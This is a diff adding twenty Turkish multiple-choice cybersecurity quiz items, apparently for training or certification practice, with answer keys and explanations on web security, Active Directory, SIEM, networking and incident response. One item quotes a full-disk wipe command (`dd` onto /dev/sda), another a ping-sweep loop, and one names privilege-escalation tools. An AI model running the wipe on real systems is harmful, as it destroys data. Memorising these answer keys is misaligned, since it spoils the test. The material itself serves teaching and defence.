+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 181,
+    "question": "Bir güvenlik testi sırasında web uygulaması error sayfasında tam stack trace ve veritabanı sorgusu görüntülüyor. Bu OWASP kategorisine göre hangi açıktır ve riski nedir?",
+    "options": {
+      "A": "Injection; hata mesajları SQL sorgu yapısını ifşa ederek saldırganın payload'unu optimize etmesini sağlar",
+      "B": "Security Misconfiguration; verbose hata mesajları sistem mimarisi, kullanılan teknoloji ve sorgu yapısı gibi değerli bilgileri saldırgana verir",
+      "C": "Cryptographic Failures; stack trace içindeki session token'lar şifrelenmemiş biçimde görünür",
+      "D": "Broken Access Control; hata mesajları başka kullanıcıların verilerine referans içerir"
+    },
+    "correct": "B",
+    "explanation": "Hata mesajlarında stack trace ve DB sorgusu göstermek Security Misconfiguration (OWASP A05) kapsamındadır. Bu bilgiler: kullanılan framework/sürümü, veritabanı tipi/yapısını, uygulama mantığını ifşa eder. Production ortamında custom hata sayfaları kullanılmalıdır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 182,
+    "question": "Active Directory ortamında 'Kerberoasting' saldırısı nasıl çalışır?",
+    "options": {
+      "A": "Domain Controller'a doğrudan brute force yapılarak TGT elde edilir",
+      "B": "Servis hesaplarının SPN'leri kullanılarak servis bileti talep edilir ve bu bilet offline olarak crack edilir; şifre tahmin için domain erişimi gerekmez",
+      "C": "NTLM kimlik doğrulaması sırasında challenge/response değerleri yakalanarak offline sözlük saldırısı yapılır",
+      "D": "Kerberos biletlerinin şifreleme algoritması downgrade edilerek zayıf şifreler brute force ile kırılır"
+    },
+    "correct": "B",
+    "explanation": "Kerberoasting: (1) Ağda bir kullanıcı hesabıyla Kerberos servis bileti (TGS) talep edilir. (2) Bilet, hedef servis hesabının şifresiyle şifrelenmiştir. (3) Bilet ağ dışına çıkarılarak offline Hashcat/John ile kırılır. Servis hesapları genellikle uzun süreli, zayıf şifre kullanır.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 183,
+    "question": "Bir güvenlik analisti `dd if=/dev/zero of=/dev/sda bs=1M` komutunu görüyor. Bu komut ne yapar ve neden tehlikelidir?",
+    "options": {
+      "A": "Diskin boş sektörlerini sıfırlarla doldurarak fragmantasyonu önler; optimizasyon amaçlıdır",
+      "B": "Diskin tamamını sıfırlarla üzerine yazar; tüm veriyi kalıcı olarak siler. Anti-forensic veya Covering Tracks amacıyla kullanılıyor olabilir",
+      "C": "Disk imajını uzak sunucuya aktarmak için şifreli tünel oluşturur",
+      "D": "Disk performans testi yapar; yazma hızını ölçmek için kullanılır"
+    },
+    "correct": "B",
+    "explanation": "`/dev/zero` sonsuz sıfır byte üretir. Bu komut sda diskinin tamamına sıfır yazar — tüm veriler silinir. Güvenli disk imha prosedürlerinde meşru kullanımı vardır; ancak bir saldırganın bunu çalıştırması Covering Tracks veya sabotaj amaçlı olabilir. Yetkisiz çalıştırılması kritik bir olaydır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 184,
+    "question": "Bir analist, SIEM'de bir kullanıcının normal mesai saatlerinde (09:00-18:00) daima İstanbul'dan bağlandığını görüyor. Gece 02:30'da aynı kullanıcı hesabından Amsterdam'dan başarılı VPN girişi var ve 5 GB veri dışarı transfer edilmiş. Hangi alarm kuralı bu senaryoyu en iyi yakalar?",
+    "options": {
+      "A": "Yalnızca büyük veri transferlerini izleyen ve 1 GB üzeri transferlerde alarm üreten kural",
+      "B": "User Entity Behavior Analytics (UEBA) tabanlı kural; kullanıcının normal davranış profilinden sapmaları (olağandışı saat, konum, veri hacmi) bir arada değerlendirerek alarm üretir",
+      "C": "Belirli ülkelerden gelen tüm bağlantıları engelleyen coğrafi kısıtlama kuralı",
+      "D": "VPN kullanımını tamamen yasaklayan ve tüm VPN bağlantılarında alarm üreten politika"
+    },
+    "correct": "B",
+    "explanation": "UEBA (User Entity Behavior Analytics), her kullanıcı için normal davranış profili oluşturur: tipik giriş saati, konum, veri hacmi. Bu senaryoda tek başına 'gece girişi', 'yurt dışı IP' veya 'büyük transfer' alarm üretmeyebilir; ancak üçü bir arada yüksek güven skorlu anomalidir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 185,
+    "question": "WPA3'ün 'Forward Secrecy' sağladığı söyleniyor. Bu, pratik açıdan ne anlama gelir?",
+    "options": {
+      "A": "Yeni cihazlar eski WPA2 parolasını olmadan ağa bağlanamaz; bu geriye dönük güvenliği ifade eder",
+      "B": "Her oturum için benzersiz şifreleme anahtarı üretilir; Wi-Fi parolası ele geçirilse bile geçmişteki trafiğin şifresi çözülemez",
+      "C": "Gelecekteki firmware güncellemeleri mevcut şifreleme metodunu otomatik güçlendirir",
+      "D": "WPA3 ağı eski WPA2 cihazları desteklemez; geriye dönük uyumluluk yoktur"
+    },
+    "correct": "B",
+    "explanation": "WPA3'ün SAE (Simultaneous Authentication of Equals) protokolü her oturum için ephemeral Diffie-Hellman key exchange yapar. Bu sayede saldırgan tüm geçmiş trafiği kaydetmiş ve parolayı sonradan öğrenmiş olsa bile geçmiş oturumları çözemez — Perfect Forward Secrecy.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 186,
+    "question": "Bir organizasyonda 'Threat Hunting' aktivitesi başlatılıyor. Doğru yaklaşım hangisidir?",
+    "options": {
+      "A": "SIEM'in ürettiği alarmları inceleyerek öncelik sırasına göre yanıt vermek",
+      "B": "Hipotez tabanlı araştırma: bilinen TTP'ler veya istihbarat verisinden yola çıkarak 'Bu teknik sistemimizde kullanılmış olabilir mi?' sorusunu aktif olarak araştırmak",
+      "C": "Tüm ağ cihazlarını günlük vulnerability scan ile tarayarak yeni açıkları bulmak",
+      "D": "Penetration test ekibinden sistemlere saldırmasını istemek ve tespit eksikliklerini raporlamak"
+    },
+    "correct": "B",
+    "explanation": "Threat Hunting, reaktif alarm yanıtından farklıdır. Hunter bir hipotez oluşturur ('APT28 T1059.001 kullanıyor; bizde PowerShell logları anormal mi?') ve mevcut güvenlik araçlarının gözden kaçırdığı kanıtları aktif olarak arar. MITRE ATT&CK, bu hipotezlerin kaynağıdır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 187,
+    "question": "Aşağıdaki şifre saklama yöntemlerini güvenli olandan güvensiz olana doğru sırala:\n1) bcrypt ile hash + salt\n2) MD5 hash\n3) SHA-256 hash\n4) bcrypt (salt otomatik dahil)",
+    "options": {
+      "A": "1 > 4 > 3 > 2",
+      "B": "4 > 1 > 3 > 2",
+      "C": "2 > 3 > 1 > 4",
+      "D": "1 = 4 > 3 > 2"
+    },
+    "correct": "D",
+    "explanation": "bcrypt, salt'ı zaten dahili olarak yönetir; 1 ve 4 eşdeğerdir. bcrypt, GPU ile hızlı hesaplama yapılamayan adaptive hash olduğundan şifre saklama için idealdir. SHA-256 hızlıdır ve GPU ile saniyede milyarlarca hash üretilebilir. MD5 hem hızlı hem de pratikte collision üretilebilmiş olduğundan en zayıftır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 188,
+    "question": "Bir güvenlik denetiminde sunucunun `nmap` taramasında 'filtered' olarak görünen portlar, 'closed' portlardan nasıl farklıdır?",
+    "options": {
+      "A": "Filtered portlar dinleniyor ancak erişim kısıtlı; closed portlar dinlenmiyor ve herkes ulaşabilir",
+      "B": "Filtered portlara paket ulaşmıyor ya da yanıt dönmüyor (firewall drop/reject); closed portlara paket ulaşıyor ve hedef RST ile 'port kapalı' yanıtı veriyor",
+      "C": "Filtered portlar TCP, closed portlar ise UDP portlarını tanımlar",
+      "D": "Filtered portlar geçici olarak kapatılmış; closed portlar kalıcı olarak servis barındırmayan portlardır"
+    },
+    "correct": "B",
+    "explanation": "nmap port durumları: Open (servis dinliyor), Closed (ulaşılabilir ama servis yok, RST döner), Filtered (paket düşürülüyor, yanıt yok — firewall), Open|Filtered (belirsiz). Filtered durum, araya güvenlik cihazı olduğuna işaret eder.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 189,
+    "question": "Bir organizasyonun 'RTO'su 4 saat ve 'RPO'su 1 saattir. Bu değerler ne anlama gelir?",
+    "options": {
+      "A": "RTO sistem tam kapasiteye dönüş süresidir; RPO ise saldırının tespit süresini ifade eder",
+      "B": "RTO, felaket sonrası sistemlerin 4 saat içinde çalışır hale getirilmesi gerektiğini; RPO, en fazla 1 saatlik veri kaybının kabul edilebilir olduğunu tanımlar",
+      "C": "RTO yedekleme sıklığını; RPO ise tam kurtarma için gereken toplam süreyi belirtir",
+      "D": "RTO güvenlik ekibinin olay yanıt süresini; RPO ise sistemin dayanıklılık (resiliency) skorunu ifade eder"
+    },
+    "correct": "B",
+    "explanation": "RTO (Recovery Time Objective): Sistemin yeniden çalışır hale gelmesi için kabul edilebilir maksimum süre. RPO (Recovery Point Objective): Veri kaybı toleransı — son yedeğin ne kadar eski olabileceği. RPO=1 saat → yedekler en fazla 1 saatte bir alınmalıdır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 190,
+    "question": "Bir saldırgan bir ağda 'ARP Spoofing' yaptıktan sonra trafiği izleyebiliyor. Ancak birkaç dakika sonra MitM kesildi çünkü bir güvenlik mekanizması devreye girdi. Bu mekanizma büyük olasılıkla nedir?",
+    "options": {
+      "A": "Firewall, anormal ARP aktivitesini tespit ederek saldırganı engelledi",
+      "B": "Dynamic ARP Inspection (DAI); switch, DHCP Snooping tablosuna göre geçersiz ARP paketlerini drop ederek ARP Spoofing'i engeller",
+      "C": "IDS imzası ARP paketlerini tanıyarak switch portunu kapattı",
+      "D": "Hedef cihaz static ARP cache kullandığından gelen sahte ARP yanıtları güncelleme yapmadı"
+    },
+    "correct": "B",
+    "explanation": "Dynamic ARP Inspection (DAI), Layer 2 güvenlik özelliğidir. Switch, DHCP Snooping tablosundaki IP-MAC-Port eşlemelerine göre ARP paketlerini doğrular. Geçersiz eşleme içeren ARP yanıtları drop edilir. Kurumsal switchlerde standart bir güvenlik önlemidir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 191,
+    "question": "Bir güvenlik araştırmacısı, şirkete ait bir web uygulamasında güvenlik açığı buldu ve bunu nasıl bildireceğinden emin değil. Organizasyon hangi programa sahip olmalıdır?",
+    "options": {
+      "A": "SIEM entegrasyonu; güvenlik açığı otomatik log olarak kaydedilmeli",
+      "B": "Bug Bounty veya Responsible Disclosure (Coordinated Vulnerability Disclosure) programı; araştırmacıların etik biçimde açık bildirmesine olanak tanır",
+      "C": "Penetration Test sözleşmesi; dışarıdan sadece sözleşmeli testçiler açık bildirebilir",
+      "D": "CVE kayıt sistemi; araştırmacı direkt MITRE'ye başvurarak açığı yayınlar"
+    },
+    "correct": "B",
+    "explanation": "Responsible Disclosure / Coordinated Vulnerability Disclosure programı, araştırmacıların buldukları açıkları şirkete özel kanaldan bildirmesine ve şirkete yamayı hazırlaması için süre tanınmasına olanak verir. Bug Bounty ise bunun ödül içeren versiyonudur. Bu sayede açık kamuoyuna duyurulmadan önce kapatılır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 192,
+    "question": "Bir kuruluş, çalışanlarına gönderilen simüle phishing e-postalarının 35%'ine tıklandığını ölçtü. Bu metriği düşürmek için en etkili uzun vadeli yöntem nedir?",
+    "options": {
+      "A": "E-posta gateway'e daha katı SPF/DKIM/DMARC kuralları eklemek",
+      "B": "Sürekli ve gerçekçi simülasyonlarla desteklenen güvenlik farkındalık eğitimi programı ve tıklayanlar için anlık geri bildirim",
+      "C": "Şüpheli e-postaları otomatik silen gelişmiş bir spam filtresi kurmak",
+      "D": "Çalışanların harici e-posta almasını yasaklayarak phishing vektörünü ortadan kaldırmak"
+    },
+    "correct": "B",
+    "explanation": "Teknik kontroller (SPF/DKIM, spam filtresi) önemlidir ancak sosyal mühendisliğe karşı en kalıcı savunma insan davranışını değiştirmektir. Simülasyon + anında geri bildirim (tıklayan çalışana neden yanlış yaptığını açıklama) + düzenli eğitim kombinasyonu en etkili yöntemdir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 193,
+    "question": "Bir forensic araştırmacı, ele geçirilmiş bir sistemde `C:\\Windows\\Temp\\` klasöründe rastgele adlı çok sayıda `.exe` dosyası buluyor. Bu bulgu neye işaret eder?",
+    "options": {
+      "A": "Windows Temp klasörü sistem güncellemeleri için kullanılır; bu normal bir aktivitedir",
+      "B": "Malware dropper veya stager bileşenleri; birçok malware ailesi payload'larını Temp klasörüne yazar çünkü genellikle yazma izni vardır ve dikkat çekmez",
+      "C": "Antivirüs yazılımı karantinaya aldığı dosyaları bu klasöre taşır; zaten temizlenmiştir",
+      "D": "Kullanıcı uygulama kurulum dosyalarını Temp'e kaydetmiş; olağan kullanıcı davranışıdır"
+    },
+    "correct": "B",
+    "explanation": "Temp klasörü, zararlı yazılımlar için popüler bir hedef dizindir: yazma izni genellikle açıktır, AV taramaları bazen bu klasörü atlar ve sistem/güvenlik ekipleri izlemeyebilir. Rastgele adlı executable'lar dropper, payload veya persistence mekanizması olabilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 194,
+    "question": "Bir güvenlik mühendisi sistemin NIST Cybersecurity Framework'e göre 'Identify' fonksiyonunu iyileştiriyor. Bu fonksiyon kapsamında hangi aktiviteler yer alır?",
+    "options": {
+      "A": "Saldırı tespiti ve alarm yönetimi; IDS/IPS kurallarını güncellemek",
+      "B": "Olayları sınırlandırma ve zararlı yazılım temizleme; Eradication süreçleri",
+      "C": "Varlık envanteri, risk değerlendirmesi, tedarik zinciri risk yönetimi ve iş ortamını anlama",
+      "D": "Yedekleme ve kurtarma planlarını test etmek; iş sürekliliğini sağlamak"
+    },
+    "correct": "C",
+    "explanation": "NIST CSF fonksiyonları: Identify (ne sahip olduğunu ve riski anla), Protect (koruma uygula), Detect (tespit et), Respond (yanıt ver), Recover (kurtar). Identify kapsamı: asset management, business environment, governance, risk assessment, supply chain risk.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 195,
+    "question": "Bir saldırı sırasında ele geçirilen sistemde `whoami /priv` komutu çalıştırılıyor ve 'SeImpersonatePrivilege' yetkisi görülüyor. Bu hangi fırsatı doğurur?",
+    "options": {
+      "A": "Saldırgan ağdaki diğer sistemlere yönelik port taraması yapabilir",
+      "B": "PrintSpoofer veya JuicyPotato gibi araçlarla SYSTEM yetkisine yükselmek için kullanılabilir",
+      "C": "Saldırgan domain admin şifrelerini memory'den çekebilir",
+      "D": "Saldırgan Windows Firewall kurallarını devre dışı bırakabilir"
+    },
+    "correct": "B",
+    "explanation": "SeImpersonatePrivilege, bir process'in başka token'ı taklit etmesine izin verir. IIS, SQL Server gibi servis hesaplarında sık bulunur. PrintSpoofer, JuicyPotato ve RoguePotato bu yetkiyi kullanarak NT AUTHORITY\\SYSTEM token'ı elde eder — tam Privilege Escalation.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 196,
+    "question": "OSINT araştırmasında 'Passive Reconnaissance' ve 'Active Reconnaissance' arasındaki fark nedir ve yasal riski hangiside taşır?",
+    "options": {
+      "A": "Passive, kamuya açık bilgileri toplar ve hedef sistemlere hiçbir paket göndermez; Active ise hedefle doğrudan etkileşim içerir ve yetkisiz olduğunda yasal risk taşır",
+      "B": "Active daha fazla bilgi sağladığından tercih edilir; Passive yalnızca başlangıç aşamasında kullanılır",
+      "C": "Passive saldırgan tarafından kullanılır; Active yalnızca yetkili penetration tester'lar tarafından yapılabilir",
+      "D": "Her ikisi de hedefle doğrudan etkileşim içerir; aradaki fark sadece kullanılan araç setleridir"
+    },
+    "correct": "A",
+    "explanation": "Passive Recon: WHOIS, LinkedIn, Shodan, Google Dorking — hedef sistemlere paket gönderilmez, iz bırakılmaz. Active Recon: nmap, nikto, dirb — hedef sistemlere paket gönderilir ve hedef bu aktiviteyi görebilir. İzin olmadan Active Recon yasal sorun yaratabilir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 197,
+    "question": "Bir organizasyon hem NIDS hem HIDS kullanıyor. Bir saldırgan şifreli C2 kanalı (HTTPS) kurduğunda hangi sistem daha etkili tespit yapabilir ve neden?",
+    "options": {
+      "A": "NIDS daha etkilidir çünkü tüm ağ trafiğini izler ve SSL inspection yapabilir",
+      "B": "HIDS daha etkilidir; şifrelenmiş olsa bile endpoint'teki process aktivitesini, registry değişikliklerini ve beklenmedik HTTPS bağlantı kurma davranışını tespit edebilir",
+      "C": "İkisi eşit derecede etkilidir; şifreli trafik her iki sistemde de tespit edilemez",
+      "D": "NIDS daha etkilidir çünkü C2 iletişimi ağ katmanında gözlemlenir; HIDS yalnızca dosya değişikliklerini izler"
+    },
+    "correct": "B",
+    "explanation": "Şifreli C2 trafiği NIDS'i atlatır; içerik okunamaz. HIDS ise şifreli olmasından bağımsız olarak svchost.exe'nin normalde bağlanmadığı bir IP'ye HTTPS bağlantısı kurmasını, process injection'ı veya anomal registry anahtarını tespit edebilir.",
+    "difficulty": "Zor",
+    "section": "extended"
+  },
+  {
+    "id": 198,
+    "question": "Bir güvenlik mühendisi sistemin 'attack surface'ini azaltmak istiyor. Aşağıdaki eylemlerden hangisi en fazla katkıyı sağlar?",
+    "options": {
+      "A": "Antivirüs yazılımını güncellemek ve yeni imza veritabanı yüklemek",
+      "B": "Kullanılmayan servisleri kapatmak, varsayılan hesapları silmek, gereksiz portları kapatmak ve en az ayrıcalık ilkesini uygulamak",
+      "C": "Ağ bant genişliğini artırmak ve yük dengeleyici eklemek",
+      "D": "SIEM'e ek log kaynakları ekleyerek görünürlüğü artırmak"
+    },
+    "correct": "B",
+    "explanation": "Attack surface reduction, istismar edilebilecek potansiyel giriş noktalarını azaltmaktır. Kullanılmayan servisi kapatmak = o servisin güvenlik açığı artık risk değil. Gereksiz port kapatmak = saldırganın hedefleri azalır. Bu OS Hardening'in temelidir.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 199,
+    "question": "Bir saldırgan `for /L %i in (1,1,254) do ping -n 1 192.168.1.%i` komutu çalıştırıyor. Bu komut ne yapar ve hangi Reconnaissance tekniğine karşılık gelir?",
+    "options": {
+      "A": "Ağdaki tüm cihazlara SYN paketi göndererek açık portları tarar; bu Port Scanning tekniğidir",
+      "B": "192.168.1.1 ile 192.168.1.254 arasındaki tüm IP adreslerine ping atarak canlı hostları keşfeder; bu Ping Sweep tekniğidir",
+      "C": "Ağdaki broadcast adresine ICMP flood göndererek Smurf saldırısı başlatır",
+      "D": "Ağdaki tüm cihazlara ARP isteği göndererek MAC adreslerini toplar; bu ARP Enumeration tekniğidir"
+    },
+    "correct": "B",
+    "explanation": "Bu Windows batch döngüsü 1-254 arasındaki her IP'ye tek ICMP ping atar. Yanıt veren hostlar 'canlı' kabul edilir. Bu Ping Sweep / Host Discovery tekniğidir. ICMP'yi engelleyen firewall'lar ping sweep sonuçlarını yanıltıcı kılar; bu nedenle nmap -sn TCP bazlı probing de kullanır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  },
+  {
+    "id": 200,
+    "question": "Bir organizasyon 'Zero Trust Network Access (ZTNA)' uyguluyor. Bu model VPN'den nasıl farklıdır?",
+    "options": {
+      "A": "ZTNA daha ucuz bir VPN çözümüdür; temel fark maliyettedir",
+      "B": "VPN bağlanan kullanıcıya ağ seviyesinde geniş erişim açar; ZTNA yalnızca belirli uygulamalara kimlik ve bağlam bazlı erişim verir ve lateral movement imkânını kısıtlar",
+      "C": "ZTNA ağ şifrelemesi yapmaz; VPN ise şifrelenmiş tünel sağlar",
+      "D": "ZTNA yalnızca cloud uygulamalar için geçerlidir; VPN ise on-premise sistemlere erişim için kullanılır"
+    },
+    "correct": "B",
+    "explanation": "Klasik VPN, bağlanan kullanıcıyı ağa alır; içeride geniş erişim mümkündür (flat network riski). ZTNA 'application-level access' sağlar: sadece yetkili olduğun uygulamaya erişirsin, ağa değil. Sürekli kimlik doğrulama ve bağlam değerlendirmesi yapılır — Zero Trust mimarisinin uzaktan erişim uygulamsıdır.",
+    "difficulty": "Orta",
+    "section": "extended"
+  }
+]
